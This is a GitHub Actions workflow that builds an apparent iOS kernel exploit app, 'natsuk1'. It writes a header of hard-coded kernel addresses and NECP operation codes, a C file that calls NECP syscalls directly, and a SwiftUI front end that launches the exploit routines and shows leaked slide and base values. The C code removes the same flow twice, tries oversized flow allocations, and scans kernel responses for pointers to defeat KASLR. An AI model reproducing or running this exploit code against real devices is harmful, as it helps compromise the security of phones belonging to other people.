name: Fix and Release

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: fix-release-${{ github.ref }}
  cancel-in-progress: false

jobs:
  build:
    runs-on: macos-26
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v5
        with:
          fetch-depth: 0

      - uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: "26.5"

      - name: Cleanup legacy
        run: |
          rm -f .github/workflows/build_and_release.yml
          rm -f .github/workflows/fix_and_test.yml
          rm -f natsuk1/Views/SimpleList.swift

      - name: Write nk_offsets.h
        run: |
          cat > natsuk1/Exploit/nk_offsets.h <<'NKEOF'
          #ifndef NK_OFFSETS_H
          #define NK_OFFSETS_H
          #define NK_KERNEL_BASE                0xFFFFFFF007004000ULL
          #define NK_SYSENT_BASE                0xFFFFFFF007C192A0ULL
          #define NK_SYSENT_COUNT               558
          #define NK_SLIDE_FALLBACK             0x3D00000ULL
          #define NK_NECP_OPEN                  0xFFFFFFF00A4E411CULL
          #define NK_NECP_CLIENT_ACTION         0xFFFFFFF00A4E5C28ULL
          #define NK_NECP_ADD_CLIENT            0xFFFFFFF00A4E60DCULL
          #define NK_NECP_REMOVE_CLIENT         0xFFFFFFF00A4E76F4ULL
          #define NK_NECP_REMOVE_FLOW           0xFFFFFFF00A4E93C4ULL
          #define NK_NECP_ADD_FLOW              0xFFFFFFF00A4E843CULL
          #define NK_NECP_COPY_LIST             0xFFFFFFF00A4E80FCULL
          #define NK_NECP_COPY_RESULT           0xFFFFFFF00A4E7BE8ULL
          #define NK_NECP_COPY_RESULT_INNER     0xFFFFFFF00A4F26F0ULL
          #define NK_NECP_COPY_INTERFACE        0xFFFFFFF00A4EAC7CULL
          #define NK_NECP_COPY_UPDATE           0xFFFFFFF00A4EC264ULL
          #define NK_NECP_SYSCTL_ARENA          0xFFFFFFF00A4EB704ULL
          #define NK_NECP_GET_TLV_AT_OFFSET     0xFFFFFFF00A4C2034ULL
          #define NK_NECP_FLOW_ALLOC            0xFFFFFFF00A346E70ULL
          #define NK_NECP_HANDLER_BIG           0xFFFFFFF00A3D91B4ULL
          #define NK_NECP_UPDATE_CACHE          0xFFFFFFF00A4EBD58ULL
          #define NK_NECP_PER_FLOW_COPY         0xFFFFFFF00A4F2E70ULL
          #define NK_SOOPTCOPYIN                0xFFFFFFF00A77FD2CULL
          #define NK_SBAPPENDCONTROL            0xFFFFFFF00A788A24ULL
          #define NK_SBAPPENDRECORD             0xFFFFFFF00A7873B8ULL
          #define NK_SBAPPENDSTREAM             0xFFFFFFF00A78811CULL
          #define NK_FN_COPYIN                  0xFFFFFFF00A368EC0ULL
          #define NK_FN_COPYOUT                 0xFFFFFFF00A369A3CULL
          #define NK_FN_KALLOC_TYPE             0xFFFFFFF00A200988ULL
          #define NK_FN_KFREE_TYPE              0xFFFFFFF00A201000ULL
          #define NK_KALLOC_TYPE_NECP_FLOW      0xFFFFFFF007C62E68ULL
          #define NK_CALLER_FLOW_ALLOC_1        0xFFFFFFF00A346474ULL
          #define NK_CALLER_FLOW_ALLOC_2        0xFFFFFFF00A348180ULL
          #define NK_CALLER_HANDLER_BIG         0xFFFFFFF00A3D9174ULL
          #define NK_WRAPPER_TLV                0xFFFFFFF00A4C113CULL
          #define NK_SYSCALL_DISPATCHER         0xFFFFFFF00A6CEB84ULL
          #define NK_NECP_OP_ADD_CLIENT         0x01
          #define NK_NECP_OP_REMOVE_CLIENT      0x02
          #define NK_NECP_OP_COPY_RESULT        0x03
          #define NK_NECP_OP_COPY_RESULT_ALT    0x04
          #define NK_NECP_OP_COPY_LIST          0x05
          #define NK_NECP_OP_REQUEST_NEXUS      0x06
          #define NK_NECP_OP_AGENT_ACTION       0x07
          #define NK_NECP_OP_COPY_AGENT         0x08
          #define NK_NECP_OP_COPY_INTERFACE     0x09
          #define NK_NECP_OP_COPY_ROUTE_STATS   0x0B
          #define NK_NECP_OP_COPY_PARAMETERS    0x0C
          #define NK_NECP_OP_SYSCTL_ARENA       0x0D
          #define NK_NECP_OP_UPDATE_CACHE       0x0E
          #define NK_NECP_OP_COPY_UPDATE        0x0F
          #define NK_NECP_OP_COPY_RESULT_LONG   0x10
          #define NK_NECP_OP_ADD_FLOW           0x11
          #define NK_NECP_OP_REMOVE_FLOW        0x12
          #define NK_NECP_OP_CLAIM              0x13
          #define NK_NECP_OP_SIGN               0x14
          #define NK_NECP_OP_GET_IFACE_ADDR     0x15
          #define NK_NECP_OP_COPY_AGENT_ALT     0x16
          #define NK_NECP_OP_VALIDATE           0x17
          #define NK_NECP_OP_GET_SIGNED_ID      0x18
          #define NK_NECP_OP_SET_SIGNED_ID      0x19
          #define NK_NECP_OP_COPY_RESULT_LONG2  0x1A
          #define NK_NECP_OP_GET_FLOW_STATS     0x1B
          #endif
          NKEOF

      - name: Write necp.c
        run: |
          cat > natsuk1/Exploit/necp.c <<'NECPEOF'
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <stdint.h>
          #include <stdbool.h>
          #include <stdarg.h>
          #include <unistd.h>
          #include <errno.h>
          #include <fcntl.h>
          #include <sys/syscall.h>
          #include <sys/sysctl.h>
          #include <sys/socket.h>
          #include <sys/utsname.h>
          #include <netinet/in.h>
          #include <mach/mach.h>
          #include <mach/message.h>
          #include "nk_api.h"
          #include "nk_offsets.h"
          #ifndef SYS_NECP_OPEN
          #define SYS_NECP_OPEN 501
          #endif
          #ifndef SYS_NECP_ACTION
          #define SYS_NECP_ACTION 502
          #endif
          #define KPTR_MIN 0xFFFFFFF000000000ULL
          #define KPTR_MAX 0xFFFFFFFFFF000000ULL
          static volatile int g_busy = 0;
          static volatile int g_cancel = 0;
          static void lg(const char *tag, const char *sign, const char *fmt, ...) {
              char body[448];
              va_list ap; va_start(ap, fmt);
              vsnprintf(body, sizeof(body), fmt, ap);
              va_end(ap);
              char out[512];
              snprintf(out, sizeof(out), "%s%s", sign, body);
              nk_logx(tag, "%s", out);
          }
          #define LI(t, ...) lg(t, "", __VA_ARGS__)
          #define LO(t, ...) lg(t, "+ ", __VA_ARGS__)
          #define LE(t, ...) lg(t, "- ", __VA_ARGS__)
          #define LW(t, ...) lg(t, "! ", __VA_ARGS__)
          #define LR(t, ...) lg(t, "> ", __VA_ARGS__)
          #define TRACE(s) LI("TRACE", ">>> " s)
          static int is_kptr(uint64_t v) { return v >= KPTR_MIN && v <= KPTR_MAX; }
          static int nfd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }
          static int nadd_client(int fd, uint8_t uuid[16]) {
              uint8_t p[1] = {0};
              return (int)syscall(SYS_NECP_ACTION, fd, NK_NECP_OP_ADD_CLIENT,
                                  uuid, (size_t)16, p, (size_t)1);
          }
          static int nadd_flow(int fd, const uint8_t cu[16], uint8_t fu[16]) {
              uint8_t req[56]; memset(req, 0, sizeof(req));
              memcpy(req + 0x10, cu, 16);
              *(uint16_t*)(req + 0x20) = 0x0040;
              int r = (int)syscall(SYS_NECP_ACTION, fd, NK_NECP_OP_ADD_FLOW,
                                   (void*)cu, (size_t)16, req, (size_t)56);
              if (r == 0) { memcpy(fu, req, 16); fu[9] |= 0x01; }
              return r;
          }
          static int nadd_flow_ex(int fd, const uint8_t cu[16], uint8_t fu[16],
                                  uint16_t flag, size_t sz) {
              uint8_t req[2048];
              if (sz > sizeof(req)) sz = sizeof(req);
              memset(req, 0, sz);
              memcpy(req + 0x10, cu, 16);
              *(uint16_t*)(req + 0x20) = flag;
              int r = (int)syscall(SYS_NECP_ACTION, fd, NK_NECP_OP_ADD_FLOW,
                                   (void*)cu, (size_t)16, req, sz);
              if (r == 0 && fu) { memcpy(fu, req, 16); fu[9] |= 0x01; }
              return r;
          }
          static int nrm_flow(int fd, const uint8_t fu[16]) {
              return (int)syscall(SYS_NECP_ACTION, fd, NK_NECP_OP_REMOVE_FLOW,
                                  (void*)fu, (size_t)16, NULL, (size_t)0);
          }
          static int ncpy_result(int fd, const uint8_t cu[16], uint8_t *b, size_t bl) {
              return (int)syscall(SYS_NECP_ACTION, fd, NK_NECP_OP_COPY_RESULT,
                                  (void*)cu, (size_t)16, b, (uint32_t)bl);
          }
          static void hexdump(const char *tag, const uint8_t *buf, int len, int max) {
              if (len > max) len = max;
              for (int i = 0; i < len; i += 16) {
                  char hex[96];
                  snprintf(hex, sizeof(hex), "%04x: %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x",
                      i, buf[i+0], buf[i+1], buf[i+2], buf[i+3], buf[i+4], buf[i+5], buf[i+6], buf[i+7],
                      buf[i+8], buf[i+9], buf[i+10], buf[i+11], buf[i+12], buf[i+13], buf[i+14], buf[i+15]);
                  LI(tag, "%s", hex);
              }
          }
          static int scan_kptr(const char *tag, const uint8_t *buf, int len, int maxhits) {
              int found = 0;
              for (int i = 0; i + 8 <= len; i += 8) {
                  uint64_t v; memcpy(&v, buf + i, 8);
                  if (is_kptr(v)) {
                      LO(tag, "[%04x] = 0x%llx", i, (unsigned long long)v);
                      found++;
                      if (found >= maxhits) break;
                  }
              }
              return found;
          }
          static void sysctl_str(const char *key) {
              char val[256]; size_t sz = sizeof(val); memset(val, 0, sizeof(val));
              if (sysctlbyname(key, val, &sz, NULL, 0) == 0) LI("SYS", "%s = %s", key, val);
          }
          static void sysctl_u64(const char *key) {
              uint64_t v = 0; size_t sz = sizeof(v);
              if (sysctlbyname(key, &v, &sz, NULL, 0) == 0) LI("SYS", "%s = %llu", key, (unsigned long long)v);
          }
          static void sysctl_u32(const char *key) {
              uint32_t v = 0; size_t sz = sizeof(v);
              if (sysctlbyname(key, &v, &sz, NULL, 0) == 0) LI("SYS", "%s = %u", key, v);
          }
          static void sysinfo(void) {
              TRACE("sysinfo");
              struct utsname u;
              if (uname(&u) == 0) LI("SYS", "%s %s %s", u.sysname, u.release, u.machine);
              sysctl_str("kern.osproductversion");
              sysctl_str("kern.osversion");
              sysctl_str("kern.uuid");
              sysctl_str("hw.machine");
              sysctl_str("hw.model");
              sysctl_u64("hw.memsize");
              sysctl_u32("hw.ncpu");
              sysctl_u32("hw.cpufamily");
          }
          static void necp_recap(void) {
              TRACE("necp_recap");
              int fd = nfd();
              if (fd < 0) { LE("RECAP", "open errno=%d", errno); return; }
              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
              nadd_client(fd, cu);
              uint8_t fu[16]; memset(fu, 0, sizeof(fu));
              nadd_flow(fd, cu, fu);
              uint32_t ops[] = {0x03, 0x04, 0x10, 0x1A};
              for (size_t i = 0; i < 4; i++) {
                  uint8_t buf[2048]; memset(buf, 0, sizeof(buf));
                  int c = (int)syscall(SYS_NECP_ACTION, fd, ops[i],
                                       (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
                  LI("RECAP", "op=0x%02x ret=%d", ops[i], c);
                  if (c > 0 && c < 600) hexdump("RECAP", buf, c, 128);
              }
              int r1 = nrm_flow(fd, fu);
              int r2 = nrm_flow(fd, fu);
              LI("RECAP", "remove#1=%d remove#2=%d", r1, r2);
              close(fd);
          }
          static void sysctl_arena_probe(void) {
              TRACE("sysctl_arena");
              int fd = nfd();
              if (fd < 0) { LE("ARENA", "open errno=%d", errno); return; }
              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
              nadd_client(fd, cu);
              uint64_t val = 0;
              int rc = (int)syscall(SYS_NECP_ACTION, fd, NK_NECP_OP_SYSCTL_ARENA,
                                    (void*)0, (size_t)0, (void*)&val, (size_t)8);
              LI("ARENA", "rc=%d value=0x%llx", rc, (unsigned long long)val);
              if (is_kptr(val)) {
                  uint64_t slide = val - NK_KERNEL_BASE;
                  LO("ARENA", "KERNEL POINTER! slide=0x%llx base=0x%llx",
                     (unsigned long long)slide,
                     (unsigned long long)(NK_KERNEL_BASE + slide));
              }
              close(fd);
          }
          static void update_cache_probe(void) {
              TRACE("update_cache");
              int fd = nfd();
              if (fd < 0) { LE("UPDCACHE", "open errno=%d", errno); return; }
              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
              nadd_client(fd, cu);
              uint8_t fu[16]; memset(fu, 0, sizeof(fu));
              nadd_flow(fd, cu, fu);
              uint8_t req[32]; memset(req, 0, sizeof(req));
              req[0] = 0x01;
              req[4] = 0x01;
              uint8_t ptr[16] = {0};
              memcpy(req + 8, ptr, 8);
              int r = (int)syscall(SYS_NECP_ACTION, fd, NK_NECP_OP_UPDATE_CACHE,
                                   (void*)cu, (size_t)16, req, (size_t)sizeof(req));
              LI("UPDCACHE", "op=0x0E ret=%d", r);
              uint8_t req2[32]; memset(req2, 0, sizeof(req2));
              req2[0] = 0x02;
              req2[4] = 0x12;
              memcpy(req2 + 8, ptr, 8);
              int r2 = (int)syscall(SYS_NECP_ACTION, fd, NK_NECP_OP_UPDATE_CACHE,
                                    (void*)cu, (size_t)16, req2, (size_t)sizeof(req2));
              LI("UPDCACHE", "op=0x0E (0x12) ret=%d", r2);
              close(fd);
          }
          static void flow_alloc_overflow_attempt(void) {
              TRACE("flow_alloc_overflow");
              int fd = nfd();
              if (fd < 0) { LE("FLOWALLOC", "open errno=%d", errno); return; }
              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
              nadd_client(fd, cu);
              uint32_t test_sizes[] = {
                  0xF0, 0x200, 0x1000, 0x4000,
                  0xFFFF0000, 0xFFFFFEA0, 0xFFFFFF80, 0x7FFFFFFF
              };
              for (size_t i = 0; i < sizeof(test_sizes)/sizeof(test_sizes[0]); i++) {
                  uint8_t fu[16]; memset(fu, 0, sizeof(fu));
                  size_t sz = test_sizes[i] & 0xFFFF;
                  if (sz < 0x24) sz = 0x24;
                  int r = nadd_flow_ex(fd, cu, fu, 0x0040, sz);
                  LI("FLOWALLOC", "size=0x%x actual=0x%zx ret=%d",
                     test_sizes[i], sz, r);
              }
              close(fd);
          }
          static void getsockopt_probe(void) {
              TRACE("getsockopt");
              int s = socket(AF_INET, SOCK_STREAM, 0);
              if (s < 0) { LE("SOCK", "socket errno=%d", errno); return; }
              int levels[] = {0xffff, 0, 6, 41};
              const char *names[] = {"SOL", "IP", "TCP", "IPV6"};
              for (size_t li = 0; li < 4; li++) {
                  for (int opt = 0; opt <= 200; opt++) {
                      uint8_t buf[128]; socklen_t bl = sizeof(buf); memset(buf, 0, sizeof(buf));
                      if (getsockopt(s, levels[li], opt, buf, &bl) == 0 && bl > 4) {
                          LI("SOCK", "%s opt=%d bl=%u", names[li], opt, (unsigned)bl);
                          hexdump("SOCK", buf, bl, 64);
                          scan_kptr("SOCK", buf, bl, 4);
                      }
                  }
              }
              close(s);
          }
          static int impl(void) {
              nk_log("");
              nk_log("================================================================");
              nk_log("natsuk1 v8.0");
              nk_log("iOS 27.0 / iPhone14,5 / 24A437");
              nk_log("================================================================");
              nk_log("");
              int fd = nfd();
              if (fd < 0) { LE("PRE", "necp_open errno=%d", errno); return 1; }
              close(fd);
              LO("PRE", "necp_open OK");
              sysinfo();
              necp_recap();
              sysctl_arena_probe();
              update_cache_probe();
              flow_alloc_overflow_attempt();
              getsockopt_probe();
              TRACE("done");
              return 0;
          }
          int nk_necp_run(void) {
              if (__sync_lock_test_and_set(&g_busy, 1)) { nk_log("[!] already running"); return 1; }
              g_cancel = 0;
              int rc = impl();
              __sync_lock_release(&g_busy);
              return rc;
          }
          void nk_necp_cancel(void) { g_cancel = 1; nk_log("[!] cancel requested"); }
          NECPEOF

      - name: Write natsuk1.swift
        run: |
          cat > natsuk1/natsuk1.swift <<'SWIFTEOF'
          import SwiftUI
          import UIKit
          import Foundation
          final class LockedBuffer: @unchecked Sendable {
              static let shared = LockedBuffer()
              private let lock = NSLock()
              private var value: String = ""
              private init() {}
              func append(_ s: String) {
                  lock.lock(); value += s + "\n"
                  if value.count > 10000 { value = String(value.suffix(6000)) }
                  lock.unlock()
              }
              func drain() -> String { lock.lock(); let v = value; value = ""; lock.unlock(); return v }
              func clear() { lock.lock(); value = ""; lock.unlock() }
          }
          private let cCallback: @convention(c) (UnsafePointer<CChar>?) -> Void = { line in
              guard let line = line else { return }
              var bytes: [UInt8] = []
              var p = line
              while p.pointee != 0 { bytes.append(UInt8(bitPattern: p.pointee)); p = p.advanced(by: 1) }
              let _line = String(decoding: bytes, as: UTF8.self)
              LockedBuffer.shared.append(_line)
              CrashLog.shared.writeLine(_line)
              AppState.shared.parseLogLine(_line)
          }
          private func osVersionString() -> String {
              let v = ProcessInfo.processInfo.operatingSystemVersion
              return "\(v.majorVersion).\(v.minorVersion)"
          }
          private func appVersionString() -> String {
              Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "1.0.0"
          }
          @main
          struct natsuk1App: App { var body: some Scene { WindowGroup { RootView() } } }
          struct RootView: View {
              @StateObject private var state = AppState.shared
              @StateObject private var offsets = OffsetsStore.shared
              @StateObject private var airlift = AirliftBridge.shared
              @AppStorage("auto_run") private var auto_run = false
              @AppStorage("keep_alive_audio") private var keep_alive_audio = false
              @AppStorage("keep_alive_location") private var keep_alive_location = false
              @Environment(\.scenePhase) private var scenePhase
              init() {
                  UserDefaults.standard.register(defaults: ["auto_run": false, "keep_alive_audio": false, "keep_alive_location": false, "lang": "en"])
              }
              var body: some View {
                  ContentView()
                      .environmentObject(state).environmentObject(offsets).environmentObject(airlift)
                      .onAppear {
                          CrashLog.shared.install()
                          if let prev = CrashLog.shared.recoverPreviousSession(), !prev.isEmpty { AppState.shared.previousCrash = prev }
                          nk_set_log(cCallback)
                          if state.log.isEmpty {
                              state.append("[*] natsuk1 v\(appVersionString())")
                              state.append("[*] iOS \(osVersionString()) / arm64e")
                              state.append("")
                          }
                          if keep_alive_audio { KeepAlive.shared.startAudio() }
                          if keep_alive_location { KeepAlive.shared.startLocation() }
                          if auto_run { DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { state.run() } }
                      }
                      .onChange(of: keep_alive_audio) { _, v in if v { KeepAlive.shared.startAudio() } else { KeepAlive.shared.stopAudio() } }
                      .onChange(of: keep_alive_location) { _, v in if v { KeepAlive.shared.startLocation() } else { KeepAlive.shared.stopLocation() } }
                      .onChange(of: scenePhase) { _, phase in if phase == .background { CrashLog.shared.markCleanShutdown() } }
              }
          }
          final class AppState: ObservableObject, @unchecked Sendable {
              static let shared = AppState()
              @Published var slide: String = "-"
              @Published var base: String = "-"
              @Published var previousCrash: String? = nil
              @Published var showCrashLog: Bool = false
              func parseLogLine(_ line: String) {
                  if let v = Self.extractHex(line, keys: ["slide=0x", "SLIDE = 0x", "slide = 0x"]) {
                      if self.slide != v { DispatchQueue.main.async { self.slide = v } }
                  }
                  if let v = Self.extractHex(line, keys: ["base=0x", "BASE = 0x", "base = 0x"]) {
                      if self.base != v { DispatchQueue.main.async { self.base = v } }
                  }
              }
              private static func extractHex(_ s: String, keys: [String]) -> String? {
                  for k in keys {
                      if let r = s.range(of: k) {
                          var hex = ""
                          for c in s[r.upperBound...] { if c.isHexDigit { hex.append(c) } else { break } }
                          if !hex.isEmpty { return "0x" + hex }
                      }
                  }
                  return nil
              }
              enum Status {
                  case idle, running, ok, failed
                  var color: Color {
                      switch self {
                      case .idle: return .secondary
                      case .running: return .orange
                      case .ok: return .green
                      case .failed: return .red
                      }
                  }
              }
              @Published var log: String = ""
              @Published var status: Status = .idle
              @Published var running: Bool = false
              @Published var show_respring: Bool = false
              @Published var lang: String { didSet { UserDefaults.standard.set(lang, forKey: "lang") } }
              private var flusher: Timer?
              private init() {
                  self.lang = UserDefaults.standard.string(forKey: "lang") ?? "en"
                  startFlusher()
              }
              func t(_ en: String, _ ru: String) -> String { lang == "ru" ? ru : en }
              private func startFlusher() {
                  flusher?.invalidate()
                  flusher = Timer.scheduledTimer(withTimeInterval: 0.3, repeats: true) { [weak self] _ in
                      guard let self = self else { return }
                      let chunk = LockedBuffer.shared.drain()
                      if chunk.isEmpty { return }
                      var newLog = self.log
                      newLog += chunk
                      if newLog.count > 30000 { newLog = String(newLog.suffix(20000)) }
                      self.log = newLog
                  }
              }
              func append(_ s: String) { LockedBuffer.shared.append(s) }
              func run() {
                  if running { return }
                  running = true; status = .running
                  Task.detached {
                      _ = nk_full_exploit()
                      await MainActor.run {
                          AppState.shared.running = false
                          AppState.shared.status = .ok
                      }
                  }
              }
              func necp_run() {
                  if running { return }
                  running = true; status = .running
                  Task.detached {
                      let rc = nk_necp_run()
                      await MainActor.run {
                          AppState.shared.running = false
                          AppState.shared.status = (rc == 0) ? .ok : .failed
                      }
                  }
              }
              func respring() {
                  DispatchQueue.main.async {
                      guard let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
                            let window = scene.windows.first(where: { $0.isKeyWindow }) ?? scene.windows.first,
                            let root = window.rootViewController else { return }
                      let host = UIHostingController(rootView: RespringView().ignoresSafeArea())
                      host.modalPresentationStyle = .fullScreen
                      root.present(host, animated: false)
                  }
              }
              func clear() { LockedBuffer.shared.clear(); log = "" }
              func cancel() {
                  nk_necp_cancel()
                  append("[*] cancel requested")
              }
          }
          SWIFTEOF

